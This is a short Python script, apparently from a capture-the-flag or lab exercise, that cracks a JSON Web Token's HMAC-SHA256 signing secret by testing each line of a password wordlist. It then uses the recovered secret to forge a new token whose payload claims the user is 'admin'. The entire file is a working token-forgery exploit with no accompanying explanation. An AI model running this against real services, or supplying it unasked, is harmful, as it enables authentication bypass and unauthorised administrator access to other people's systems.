#!/usr/bin/env python3

"""
reference : https://gist.github.com/darelf/190bc97b29e91509534d7535ebde4762

"""

import base64
import hmac
import hashlib
import json

jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM'
secret = ''

header, payload, signature = jwt.split(".")
hdata = header + '.' + payload
with open("password.txt","r") as f:
	for s in f:
		byte_s = bytes(s,encoding='utf-8').rstrip()
		signature_hmac = hmac.new(byte_s, hdata.encode('utf-8'), 'sha256')
		signed = base64.urlsafe_b64encode(signature_hmac.digest()).decode().strip('=')
		verified = hmac.compare_digest(signature, signed)
		print (verified)
		if(verified):
		#if signed == signature:
			secret = s
			print("Secret is " + s )
# calculate admin token
admin_payload_json = {"user":"admin"}
admin_payload_dump = json.dumps(admin_payload_json).encode('utf-8')
admin_payload = base64.urlsafe_b64encode(admin_payload_dump).decode().strip('=')
new_hdata = header + '.' + admin_payload
new_sign_hmac = hmac.new(bytes(secret,encoding='utf-8').rstrip(), new_hdata.encode('utf-8'), 'sha256')
new_sign = base64.urlsafe_b64encode(new_sign_hmac.digest()).decode().strip('=')
admin_token = new_hdata + '.' + new_sign

print ('New admin token is ' + admin_token)			
